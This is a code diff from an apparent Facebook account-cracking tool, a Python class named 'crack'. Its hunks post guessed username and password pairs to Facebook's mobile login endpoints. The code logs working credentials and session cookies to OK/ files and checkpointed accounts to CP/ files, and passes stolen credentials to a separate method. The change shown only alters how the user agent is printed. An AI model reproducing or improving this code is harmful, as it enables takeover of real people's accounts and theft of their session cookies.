@@ -694,13 +694,13 @@ class crack:
 				response = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/',params=params, headers=headers, data=data, allow_redirects=False)
 				if 'c_user' in ses.cookies.get_dict():
 					kukis = (";").join([key+"="+value for key, value in ses.cookies.get_dict().items()])
-					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n{P} └─ {U}{self.UA()} \n ')
+					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n{P} └─ {U}{ua} \n ')
 					info = f"{user} ◊ {pw} ◊ {kukis}"
 					ok.append(f"{info}")
 					open(f'OK/{waktu}.txt', 'a').write(f"{info}\n");self.___raka_andrian_tara___(kukis,user,pw)
 					break
 				elif 'checkpoint' in ses.cookies.get_dict():
-					print (f'\r{P}└── {K}{user} ◊ {pw}  \n{P} └─ {U}{self.UA()} \n ')
+					print (f'\r{P}└── {K}{user} ◊ {pw}  \n{P} └─ {U}{ua} \n ')
 					info = f'{user} ◊ {pw}'
 					cp.append(f'{info}')
 					open(f'CP/{waktu}.txt', 'a').write(f"{info}\n")
@@ -762,13 +762,13 @@ class crack:
 				response = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?next=https://developers.facebook.com/docs/meta-pixel/?locale%3Did_ID&refsrc=deprecated&lwv=100&locale2=id_ID', headers=headers, data=data, allow_redirects=False)
 				if 'c_user' in ses.cookies.get_dict():
 					kukis = (";").join([key+"="+value for key, value in ses.cookies.get_dict().items()])
-					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n{P} └─ {U}{self.UA()} \n ')
+					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n{P} └─ {U}{ua} \n ')
 					info = f"{user} ◊ {pw} ◊ {kukis}"
 					ok.append(f"{info}")
 					open(f'OK/{waktu}.txt', 'a').write(f"{info}\n");self.___raka_andrian_tara___(kukis,user,pw)
 					break
 				elif 'checkpoint' in ses.cookies.get_dict():
-					print (f'\r{P}└── {K}{user} ◊ {pw}  \n{P} └─ {U}{self.UA()} \n ')
+					print (f'\r{P}└── {K}{user} ◊ {pw}  \n{P} └─ {U}{ua} \n ')
 					info = f'{user} ◊ {pw}'
 					cp.append(f'{info}')
 					open(f'CP/{waktu}.txt', 'a').write(f"{info}\n")
